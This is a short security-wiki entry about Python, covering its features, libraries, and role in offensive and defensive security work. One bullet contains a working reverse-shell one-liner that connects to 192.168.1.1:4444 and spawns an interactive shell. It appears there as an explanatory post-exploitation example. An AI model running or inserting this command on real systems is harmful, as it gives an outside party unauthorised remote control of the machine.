# Python

[[🏷️Python]] [[🏷️Interpreter]]

Python is a high-level, interpreted programming language known for its readability, simplicity, and extensive standard library. Created by Guido van Rossum and first released in 1991, Python has become one of the most widely used programming languages across system administration, web development, data science, and security tooling. Its combination of rapid development, cross-platform support, and rich ecosystem makes it a dominant language in both offensive and defensive security work.

- **Interpreted and dynamic:** Python executes code line by line through an interpreter rather than compiling to a binary. This makes it well suited for rapid prototyping, interactive exploration, and scripting, at the cost of raw execution speed compared to compiled languages.
- **Extensive standard library:** Python ships with a large standard library covering networking, file I/O, cryptography, HTTP, JSON parsing, subprocess execution, and more. Many security tools can be built using only the standard library without any external dependencies.
- **Package ecosystem:** The Python Package Index (PyPI) provides a vast collection of third party libraries installable via pip. Security-relevant packages include Scapy for packet crafting, Requests for HTTP, Paramiko for SSH, Impacket for Windows network protocols, and Pwntools for exploit development.
- **Cross-platform:** Python runs on Linux, Windows, and macOS with minimal modification. This is particularly useful for offensive tooling that needs to operate across different target environments.
- **Scripting and automation:** Python is widely used for automating repetitive tasks, parsing output, interacting with APIs, and building tooling around other programs. In security contexts this includes log parsing, vulnerability scanning, report generation, and interfacing with security platforms.
- **Object oriented and functional:** Python supports multiple programming paradigms, allowing code to be structured as classes and objects or as simple procedural scripts depending on the complexity of the task.
- **Offensive relevance:** Python is one of the most commonly used languages in offensive security. Exploit scripts, custom C2 frameworks, payload generators, network scanners, and fuzzing tools are frequently written in Python. Tools like Impacket, Volatility, Scapy, and many Metasploit auxiliary modules are Python based. Its availability on most Linux systems also makes it useful for post-exploitation once access is gained.
- **Reverse shells:** Python reverse shells are a staple of post-exploitation due to Python's near-universal presence on Linux systems. A basic reverse shell can be executed in a single command: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
- **Defensive tooling:** On the defensive side Python is used extensively for SIEM integrations, threat intelligence processing, malware analysis, forensics tooling, and building detection logic. Many open source security platforms expose Python APIs for automation and extension.
- **Version fragmentation:** Python 2 reached end of life in 2020 but remains present on older systems. Python 2 and Python 3 have meaningful syntax differences, and legacy Python 2 scripts and tools are still encountered in the wild, particularly on older targets during penetration testing.

Python's combination of simplicity, power, and ubiquity makes it an essential language for anyone working in security, sitting alongside bash as one of the two most practical languages to master for both offensive and defensive work.

---

See also:

- [[Bourne Again SHell (Bash)]]
- [[Reverse shell]]
